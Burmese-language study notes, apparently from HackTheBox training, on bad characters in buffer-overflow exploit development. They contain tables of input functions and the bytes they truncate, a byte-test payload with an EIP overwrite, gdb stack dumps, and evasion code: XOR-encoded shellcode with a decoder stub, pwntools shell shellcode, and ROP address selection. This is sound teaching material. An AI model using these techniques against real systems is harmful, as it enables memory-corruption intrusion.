
**Bad Character** ဆိုတာ payload (exploit code) ထဲမှာ မထည့်သင့်တဲ့ byte value
ဘာလို့လဲဆိုတော့ အဲဒီ byte က:
- Payload ကို ဖြတ်တောက်ပစ်မယ် (truncation)
- Program ကို crash ဖြစ်စေမယ်
- Exploit ကို ပျက်စီးစေမယ်

---

#### Root Cause

 bad character ကိုသတ်မှတ်တာက Input Processing Functions တွေဖြစ်တယ်
အဓိက အကြောင်းရင်းက program က input ကို ဘယ်လို handle လုပ်သလဲ ဆိုတာပေါ် မူတည်တယ်

##### Commons

| Function      | Behavior                                | Bad Chars                      |
| ------------- | --------------------------------------- | ------------------------------ |
| `strcpy()`    | Null byte (`\x00`) မှာ ရပ်              | `\x00`                         |
| `strncpy()`   | Null byte ရောက်ရင် ရပ် (size ရှိပေမယ့်) | `\x00`                         |
| `gets()`      | Newline (`\n`) မှာ ရပ်                  | `\x0a`, `\x0d`                 |
| `fgets()`     | Newline ရောက်ရင် ရပ်                    | `\x0a` (if size allows)        |
| `scanf("%s")` | Whitespace မှာ ရပ်                      | `\x20`, `\x09`, `\x0a`, `\x0d` |
| `read()`      | သတ်မှတ် size ထိ ဖတ်                     | မရှိ (raw read)                |
| `memcpy()`    | size အတိုင်း copy                       | မရှိ                           |

##### Other Root causes

#####  String Manipulation Functions

| Function      | Behavior                                  | Bad Chars |
| ------------- | ----------------------------------------- | --------- |
| `strcat()`    | Null byte မှာ ရပ်                         | `\x00`    |
| `strncat()`   | Null byte ရောက်ရင် ရပ်                    | `\x00`    |
| `sprintf()`   | Null byte မှာ ရပ်                         | `\x00`    |
| `snprintf()`  | Null byte မှာ ရပ် (buffer size ရှိပေမယ့်) | `\x00`    |
| `vsprintf()`  | Null byte မှာ ရပ်                         | `\x00`    |
| `vsnprintf()` | Null byte မှာ ရပ်                         | `\x00`    |

##### Input Functions 

| Function    | Behavior                              | Bad Chars           |
| ----------- | ------------------------------------- | ------------------- |
| `fgetc()`   | EOF သို့မဟုတ် error မှာ ရပ်           | None (byte by byte) |
| `getchar()` | EOF မှာ ရပ်                           | None                |
| `fscanf()`  | Whitespace/format specifier ပေါ်မူတည် | Depends on format   |
| `sscanf()`  | Whitespace/format specifier ပေါ်မူတည် | Depends on format   |
| `fread()`   | size အတိုင်းဖတ်                       | None (raw)          |

##### Network/Protocol Functions

| Function/API          | Behavior                         | Bad Chars              |
| --------------------- | -------------------------------- | ---------------------- |
| `recv()`              | size အတိုင်းဖတ်                  | None (raw)             |
| `recvfrom()`          | size အတိုင်းဖတ်                  | None (raw)             |
| `recvmsg()`           | size အတိုင်းဖတ်                  | None (raw)             |
| `readline()` (custom) | Newline မှာ ရပ်                  | `\x0a`, `\x0d`         |
| `HTTP parsers`        | Headers end (`\x0a\x0d\x0a\x0d`) | `\x0a`, `\x0d`, `\x00` |

##### Custom Application Parsers

| Parser Type        | Behavior                      | Bad Chars                              |
| ------------------ | ----------------------------- | -------------------------------------- |
| **JSON parser**    | Special chars break structure | `"`, `\`, `{`, `}`, `[`, `]`, `:`, `,` |
| **XML parser**     | Tags break structure          | `<`, `>`, `/`, `"`, `'`, `&`           |
| **Base64 decoder** | Padding char                  | `=` (0x3d)                             |
| **URL decoder**    | Percent sign                  | `%` (0x25)                             |
| **CSV parser**     | Delimiters                    | `,` (0x2c), `"`, `\n`                  |
| **INI parser**     | Sections, keys                | `[`, `]`, `=`, `;`, `#`                |
| **SQL parser**     | String delimiter              | `'`, `"`, `` ` `` \|                   |

##### Command Line / Shell Parsers

| Context                   | Behavior                  | Bad Chars                 |                                                             |
| ------------------------- | ------------------------- | ------------------------- | ----------------------------------------------------------- |
| **argc/argv**             | Space/tab separates args  | `\x20`, `\x09`            |                                                             |
| **Shell expansion**       | Special chars interpreted | `$`, `` ` ``, `(`, `)`, ` | `,` &`,` ;`,` <`,` >`,` *`,` ?`,` [`,` ]`,` {`,` }`,` ~` \| |
| **Environment variables** | Null terminated           | `\x00`                    |                                                             |


##### Encoding/Decoding Functions

| Function              | Behavior              | Bad Chars               |
| --------------------- | --------------------- | ----------------------- |
| `strtol()` / `atoi()` | Non-digit chars stop  | `\x00`, non-digit chars |
| `hexdecode()`         | Invalid hex chars     | Non [0-9A-Fa-f]         |
| `b64decode()`         | Invalid base64        | Non [A-Za-z0-9+/=]      |
| `urldecode()`         | `%` followed by 2 hex | `%` (if incomplete)     |


---


#### Bad Characters Types

##### Type 1: String Terminators (most common)
```
\x00  (NULL)     - C string terminator
\x0a  (LF)       - Line feed / newline  
\x0d  (CR)       - Carriage return
```

##### Type 2: Whitespace / Delimiters
```
\x20  (SPACE)    - Command line argument separator
\x09  (TAB)      - Tab character
\x0b  (VT)       - Vertical tab
\x0c  (FF)       - Form feed
```

##### Type 3: Protocol-Specific Characters
```
Network/HTTP:
\x0a, \x0d, \x00  - Protocol delimiters
URL Encoding:
\x25  (%)         - URL encoding prefix
\x26  (&)         - Parameter separator
\x3f  (?)         - Query string start
XML/HTML:
\x3c  (<)         - Tag start
\x3e  (>)         - Tag end
\x26  (&)         - Entity reference
\x22  (")         - Attribute quote
\x27  (')         - Attribute quote
```

##### Type 4: Application-Specific Characters
```
Base64:     \x3d (=)    - Padding
JSON:       \x22 ("), \x5c (\) - String delimiters
CSV:        \x2c (,)    - Field separator
Custom:     Any byte depending on parser
```

---


#### How to find  Bad Characters


#### Method1

#####  Character List
```bash
K1ll3rRanger@htb[/htb]$ CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

##### Calculate length
```bash
K1ll3rRanger@htb[/htb]$ echo $CHARS | sed 's/\\x/ /g' | wc -w

256
```

##### Prepare Payload
```
Buffer = "\x55" * (1040 - 256 - 4) = 780
 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```


##### Check on the stack
```
(gdb) x/2000xb $esp+500

0xffffd28a: 0xbb    0x69    0x36    0x38    0x36    0x00    0x00    0x00
0xffffd292: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0xffffd29a: 0x00    0x2f    0x68    0x6f    0x6d    0x65    0x2f    0x73
0xffffd2a2: 0x74    0x75    0x64    0x65    0x6e    0x74    0x2f    0x62
0xffffd2aa: 0x6f    0x77    0x2f    0x62    0x6f    0x77    0x33    0x32
0xffffd2b2: 0x00    0x55    0x55    0x55    0x55    0x55    0x55    0x55
                 # |---> "\x55"s begin

0xffffd2ba: 0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
0xffffd2c2: 0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
<SNIP>
```


#### Method 2
##### Step 1: Generate Test Payload
```python
#!/usr/bin/env python3
import sys
def generate_badchar_test():
    """Generate all bytes from 0x00 to 0xff"""
    test_bytes = b''
    for i in range(0x00, 0x100):
        test_bytes += bytes([i])
    return test_bytes

# Example: Send to program
payload = b'A' * 264 + generate_badchar_test()
print(payload)
```

##### Step 2: Send to Program with GDB
```bash
# Method 1: Command line argument
gdb -q ./bow32
(gdb) run $(python3 badchar_test.py)
# Method 2: Using stdin
(gdb) run < input.txt
# Method 3: With pwntools (best)
```

##### Step 3: Analyze Memory for Missing Bytes
```gdb
# After crash, check where payload ended up
(gdb) x/256xb $rsp        # Check stack for missing bytes
(gdb) x/s $rsp            # Check as string (shows truncation)
(gdb) x/300xb $rsp+200    # Scan further
```

##### Step 4: Compare Expected vs Actual
```python
# expected = all bytes 0x00-0xff
expected = set(range(0x100))
# actual = bytes found in memory
actual = set(bytes_from_memory)
# Bad chars = expected - actual
bad_chars = expected - actual
print(f"Bad characters: {[hex(b) for b in sorted(bad_chars)]}")
```

---

#### How to bypass (Evasion Techniques)

##### Technique 1: Use Different Functions
```python
# Problem: Can't use strcpy (bad: \x00)
# Solution: Use read() or memcpy() instead if possible
# Don't use:
payload = "AAA\x00BBB"  # Truncated
# Use read() based input:
payload = b'AAA\x00BBB'  # read() handles null bytes
```

##### Technique 2: Encoding Payload
```python
# Bad: Contains null bytes
shellcode = b'\x31\xc0\x00\x50\x68\x2f\x2f\x73\x68'
# Good: Alphanumeric shellcode (no bad chars)
from pwn import *
shellcode = asm(shellcraft.sh())
encoded = enhex(shellcode)  # or use xor encoding
```

##### Technique 3: XOR Encoding
```python
def xor_encode(data, key=0x55):
    """XOR encode payload to avoid bad chars"""
    encoded = bytes([b ^ key for b in data])
    return encoded

def xor_decode_stub(encoded, key=0x55):
    """Decoder stub in assembly"""
    decoder = asm(f"""
        xor rsi, rsi
        xor rcx, rcx
        mov cl, {len(encoded)}
        lea rsi, [rip+encoded_data]
    decode_loop:
        xor byte [rsi], {key}
        inc rsi
        loop decode_loop
        jmp rsi
    encoded_data:
    """) + encoded
    return decoder

# Usage
original_shellcode = b'\x31\xc0\x48\xbb\xd1...'
encoded = xor_encode(original_shellcode, 0x55)
# encoded has no bad chars!
```

##### Technique 4: Use Different Addresses (Gadget ROP)
```python 
# Bad: Address contains null byte
bad_addr = 0x08040000  # contains \x00

# Good: Address with no bad chars
good_addr = 0x080491a3  # \xa3\x91\x04\x08

# Find alternative gadgets
# Check memory for other ROP gadgets without bad chars
```


##### Technique 5: Split Payload
```python
# Send payload in chunks
chunk1 = b'A'*offset + p32(addr1)  # Part 1
chunk2 = p32(addr2) + p32(addr3)   # Part 2

# Send sequentially
p.send(chunk1)
p.send(chunk2)
```


|Scenario|Bad Characters|
|---|---|
|**CTF Linux x86/x64**|`\x00\x0a\x0d` (almost always)|
|**Windows**|`\x00\x0a\x0d` (sometimes `\xff`)|
|**Command line**|`\x00\x20\x09\x0a\x0d`|
|**gets()/fgets()**|`\x0a\x0d`|
|**strcpy()**|`\x00`|
|**scanf("%s")**|`\x20\x09\x0a\x0d`|
|**HTTP protocol**|`\x00\x0a\x0d\x20`|
|**URL parameter**|`\x00\x0a\x0d\x25\x26\x3f`|****

---



